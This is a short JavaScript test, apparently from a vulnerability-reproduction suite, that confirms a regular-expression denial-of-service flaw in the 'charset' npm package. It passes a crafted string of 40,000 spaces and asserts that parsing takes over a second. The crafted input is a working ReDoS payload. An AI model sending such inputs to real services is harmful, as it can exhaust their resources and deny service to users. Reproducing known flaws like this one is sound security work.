//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-charset.js
test("ReDos in charset", () => {
    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const charset = require('charset');
    expect({}.polluted).toBe(undefined);
  
    let t = measureTime(function () {
        var agent = charset("encoding=" + genstr(40000, " "));
    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
  });